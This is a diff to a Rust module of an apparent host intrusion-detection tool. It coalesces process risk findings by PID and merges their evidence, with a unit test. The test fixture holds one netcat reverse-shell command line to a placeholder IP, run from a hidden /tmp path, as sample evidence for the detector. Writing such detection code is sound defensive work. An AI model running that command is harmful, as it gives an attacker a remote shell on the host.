@@ -1,19 +1,25 @@
 use sentinel_core::{Evidence, Finding};
 use std::collections::{BTreeMap, BTreeSet};
 
-/// Coalesce findings that describe the same underlying resource change.
+/// Coalesce findings that describe the same underlying resource or runtime entity.
 ///
 /// Detectors intentionally stay independent, so a systemd unit change can be
-/// recognized by both file-integrity and persistence detectors. This pass keeps
-/// detection modular while preventing users from receiving several messages for
-/// one changed file.
+/// recognized by both file-integrity and persistence detectors, and one process
+/// can have several risk signals. This pass keeps detection modular while
+/// preventing users from receiving several messages for one underlying object.
 pub(crate) fn coalesce_related_findings(findings: Vec<Finding>) -> Vec<Finding> {
-    let mut grouped = BTreeMap::<String, Vec<Finding>>::new();
+    let mut resource_groups = BTreeMap::<String, Vec<Finding>>::new();
+    let mut process_groups = BTreeMap::<String, Vec<Finding>>::new();
     let mut retained = Vec::new();
 
     for finding in findings {
         if is_file_persistence_drift(&finding) {
-            grouped
+            resource_groups
+                .entry(resource_group_key(&finding))
+                .or_default()
+                .push(finding);
+        } else if is_process_signal(&finding) {
+            process_groups
                 .entry(resource_group_key(&finding))
                 .or_default()
                 .push(finding);
@@ -22,7 +28,8 @@ pub(crate) fn coalesce_related_findings(findings: Vec<Finding>) -> Vec<Finding> 
         }
     }
 
-    retained.extend(grouped.into_values().map(merge_resource_findings));
+    retained.extend(resource_groups.into_values().map(merge_resource_findings));
+    retained.extend(process_groups.into_values().map(merge_process_findings));
     retained
 }
 
@@ -35,6 +42,13 @@ fn is_file_persistence_drift(finding: &Finding) -> bool {
 
 fn resource_group_key(finding: &Finding) -> String {
     format!("{}\n{}", finding.host_id, finding.subject)
+}
+
+fn is_process_signal(finding: &Finding) -> bool {
+    matches!(
+        finding.rule_id.as_str(),
+        "PROC-001" | "PROC-002" | "PROC-003" | "PROC-004" | "PROC-005"
+    )
 }
 
 fn merge_resource_findings(mut findings: Vec<Finding>) -> Finding {
@@ -56,11 +70,41 @@ fn merge_resource_findings(mut findings: Vec<Finding>) -> Finding {
     primary
 }
 
+fn merge_process_findings(mut findings: Vec<Finding>) -> Finding {
+    if findings.len() == 1 {
+        return findings.remove(0);
+    }
+
+    findings.sort_by_key(|finding| process_rule_priority(&finding.rule_id));
+    let mut primary = findings.remove(0);
+    let evidence = merge_process_evidence(&primary, &findings);
+    primary = primary.with_evidence(evidence);
+    primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
+        &item.impact
+    });
+    primary.recommendations =
+        merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
+            &item.recommendations
+        });
+    primary
+}
+
 fn rule_priority(rule_id: &str) -> u8 {
     match rule_id {
         "PERSIST-003" => 0,
         "PERSIST-001" => 1,
         "FILE-001" => 2,
+        _ => 10,
+    }
+}
+
+fn process_rule_priority(rule_id: &str) -> u8 {
+    match rule_id {
+        "PROC-003" => 0,
+        "PROC-004" => 1,
+        "PROC-002" => 2,
+        "PROC-005" => 3,
+        "PROC-001" => 4,
         _ => 10,
     }
 }
@@ -84,6 +128,32 @@ fn merge_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
     evidence
 }
 
+fn merge_process_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
+    let mut evidence = Vec::new();
+    for key in [
+        "pid",
+        "ppid",
+        "name",
+        "exe_path",
+        "cmdline",
+        "cwd",
+        "euid",
+        "socket_fd_count",
+    ] {
+        push_first_evidence(&mut evidence, primary, related, key);
+    }
+    evidence.push(Evidence::new(
+        "signals",
+        process_signal_names(primary, related).join(", "),
+    ));
+    if let Some(score) = max_numeric_evidence(primary, related, "risk_score") {
+        evidence.push(Evidence::new("risk_score", score.to_string()));
+    }
+    push_joined_evidence(&mut evidence, primary, related, "risk_reasons");
+    push_joined_evidence(&mut evidence, primary, related, "risk_features");
+    evidence
+}
+
 fn signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
     let mut signals = BTreeSet::new();
     for finding in std::iter::once(primary).chain(related.iter()) {
@@ -93,6 +163,31 @@ fn signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
             }
             "PERSIST-001" | "PERSIST-003" => {
                 signals.insert("persistence");
+            }
+            _ => {}
+        }
+    }
+    signals.into_iter().collect()
+}
+
+fn process_signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
+    let mut signals = BTreeSet::new();
+    for finding in std::iter::once(primary).chain(related.iter()) {
+        match finding.rule_id.as_str() {
+            "PROC-001" => {
+                signals.insert("temporary path");
+            }
+            "PROC-002" => {
+                signals.insert("deleted executable");
+            }
+            "PROC-003" => {
+                signals.insert("network execution bridge");
+            }
+            "PROC-004" => {
+                signals.insert("miner or scanner indicator");
+            }
+            "PROC-005" => {
+                signals.insert("behavior cluster");
             }
             _ => {}
         }
@@ -143,6 +238,15 @@ fn unique_evidence_values(primary: &Finding, related: &[Finding], key: &str) -> 
         }
     }
     values.into_iter().collect()
+}
+
+fn max_numeric_evidence(primary: &Finding, related: &[Finding], key: &str) -> Option<u16> {
+    std::iter::once(primary)
+        .chain(related.iter())
+        .flat_map(|finding| finding.evidence.iter())
+        .filter(|item| item.key == key)
+        .filter_map(|item| item.value.parse::<u16>().ok())
+        .max()
 }
 
 fn merge_text_lists<'a>(
@@ -200,6 +304,33 @@ mod tests {
     }
 
     #[test]
+    fn coalesces_process_findings_for_same_pid() {
+        let findings = coalesce_related_findings(vec![
+            process_finding("PROC-001", Severity::High),
+            process_finding("PROC-003", Severity::Critical).with_evidence(vec![
+                Evidence::new("pid", "42"),
+                Evidence::new("ppid", "1"),
+                Evidence::new("name", "sh"),
+                Evidence::new("exe_path", "/tmp/.x/sh"),
+                Evidence::new("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
+                Evidence::new("risk_score", "120"),
+                Evidence::new("risk_reasons", "network execution bridge"),
+                Evidence::new("risk_features", "fd_bridge"),
+            ]),
+        ]);
+
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, "PROC-003");
+        assert!(findings[0].evidence.iter().any(|item| item.key == "signals"
+            && item.value.contains("network execution bridge")
+            && item.value.contains("temporary path")));
+        assert!(findings[0]
+            .evidence
+            .iter()
+            .any(|item| item.key == "risk_score" && item.value == "120"));
+    }
+
+    #[test]
     fn keeps_unrelated_file_findings_separate() {
         let mut other = finding("PERSIST-001", Category::Persistence);
         other.subject = "/etc/systemd/system/other.service".to_string();
@@ -223,6 +354,25 @@ mod tests {
             Evidence::new("change", "file_created"),
             Evidence::new("previous_hash", ""),
             Evidence::new("current_hash", "abc"),
+        ])
+    }
+
+    fn process_finding(rule_id: &str, severity: Severity) -> Finding {
+        Finding::new(
+            "host",
+            "process",
+            "process",
+            severity,
+            Category::Process,
+            rule_id,
+            "42",
+        )
+        .with_evidence(vec![
+            Evidence::new("pid", "42"),
+            Evidence::new("ppid", "1"),
+            Evidence::new("name", "sh"),
+            Evidence::new("exe_path", "/tmp/.x/sh"),
+            Evidence::new("cmdline", "/tmp/.x/sh"),
         ])
     }
 }
